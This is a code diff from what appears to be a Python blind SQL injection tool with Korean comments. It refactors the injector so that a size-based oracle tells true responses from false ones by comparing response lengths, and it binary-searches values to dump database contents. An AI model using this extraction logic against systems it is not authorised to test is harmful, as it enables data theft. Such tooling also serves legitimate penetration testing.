@@ -1,10 +1,7 @@
 """DBMS와 독립적인 실행 흐름. 네트워크 오류는 거짓 결과로 간주하지 않는다."""
 
 from .dbms import Dialect
-
-
-class ExecutionError(ValueError):
-    pass
+from .oracle import ExecutionError, SizeOracle
 
 
 def bounded_integer(predicate, maximum):
@@ -26,11 +23,10 @@ class Injector:
         self.args = args
         self.client = client
         self.dialect = Dialect(args.dbms)
-        self.baseline = None
+        self.oracle = SizeOracle(client, args.threshold)
 
     def check(self, predicate):
-        condition = self.client.request.condition.replace("1=2", predicate)
-        return self.client.size(condition) - self.baseline > self.args.threshold
+        return self.oracle.check(predicate)
 
     def number(self, expression, maximum):
         return bounded_integer(lambda middle: self.check(f"({expression})>{middle}"), maximum)
@@ -44,11 +40,12 @@ class Injector:
         return "".join(characters)
 
     def execute(self):
-        self.baseline = self.client.size(self.client.request.condition)
-        if not self.check("1=1"):
-            raise ExecutionError(
-                "참·거짓 응답을 구분할 수 없습니다. 요청 파일과 응답 크기 기준을 확인하세요."
-            )
+        self.oracle.calibrate()
+        results = self.extract()
+        self.oracle.verify()
+        return results
+
+    def extract(self):
         if self.args.basic:
             return {query.label: self.text(query.item(0)) for query in self.dialect.basic()}
         if self.args.dump:
